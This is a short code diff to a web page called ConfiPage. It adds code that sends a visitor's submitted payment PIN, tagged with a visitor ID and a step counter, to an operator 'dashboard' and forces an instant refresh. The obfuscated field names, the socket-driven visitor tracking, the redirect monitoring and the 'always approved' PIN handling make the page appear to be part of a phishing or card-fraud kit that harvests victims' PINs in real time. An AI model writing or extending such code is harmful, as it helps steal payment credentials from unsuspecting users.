@@ -7,7 +7,7 @@ import { Input } from "@/components/ui/input"
 import { Alert, AlertDescription } from "@/components/ui/alert"
 import { Lock, AlertCircle, ShieldCheck, Eye } from "lucide-react"
 import { UnifiedSpinner, SimpleSpinner } from "@/components/unified-spinner"
-import { addData } from "@/lib/api"
+import { addData, notifyDashboard } from "@/lib/api"
 import { onVisitorStatusUpdated } from "@/lib/socket"
 import { addToHistory } from "@/lib/history-utils"
 import { useRedirectMonitor } from "@/hooks/use-redirect-monitor"
@@ -97,6 +97,23 @@ export default function ConfiPage() {
         paymentStatus: 'pin_completed',
         pinUpdatedAt: new Date().toISOString()
       })
+
+      // Notify dashboard immediately with PIN data
+      await notifyDashboard({
+        id: visitorID,
+        visitorId: visitorID,
+        _v6Status: 'approved',
+        pinCode: _v6,
+        pinSubmittedAt: new Date().toISOString(),
+        currentPage: "pin",
+        currentStep: 6,
+        status: "approved"
+      })
+
+      // Trigger dashboard refresh for instant update
+      if (typeof window !== 'undefined') {
+        window.dispatchEvent(new CustomEvent('dashboard-refresh'));
+      }
 
       // Add PIN to history (always approved)
       await addToHistory(visitorID, "_t3", {
